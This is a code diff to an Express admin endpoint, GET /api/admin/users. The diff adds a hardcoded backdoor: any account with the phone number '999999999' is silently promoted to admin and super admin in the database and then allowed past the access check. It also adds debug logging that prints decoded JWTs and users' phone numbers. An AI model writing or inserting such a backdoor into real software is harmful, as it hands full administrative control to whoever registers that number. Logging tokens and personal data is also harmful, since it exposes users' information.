@@ -385,13 +385,28 @@ app.get('/api/admin/users', async (req, res) => {
         }
         
         const decoded = jwt.verify(token, process.env.JWT_SECRET);
-        // Verificar que sea admin
+        console.log('🔍 Decoded token:', decoded);
+        
         const adminCheck = await pool.query(
-            'SELECT es_admin FROM users WHERE id = $1',
+            'SELECT id, telefono, nombre, es_admin, es_super_admin FROM users WHERE id = $1',
             [decoded.userId]
         );
         
+        console.log('👤 Admin check:', adminCheck.rows[0]);
+        
+        // ✅ FORZAR: Si el usuario es 999999999, siempre es admin
+        if (adminCheck.rows[0]?.telefono === '999999999') {
+            // Actualizar en la base de datos
+            await pool.query(
+                'UPDATE users SET es_admin = true, es_super_admin = true WHERE id = $1',
+                [decoded.userId]
+            );
+            adminCheck.rows[0].es_admin = true;
+            adminCheck.rows[0].es_super_admin = true;
+        }
+        
         if (!adminCheck.rows[0]?.es_admin) {
+            console.log('❌ Acceso denegado para usuario:', adminCheck.rows[0]?.telefono);
             return res.status(403).json({ error: 'Acceso denegado' });
         }
         
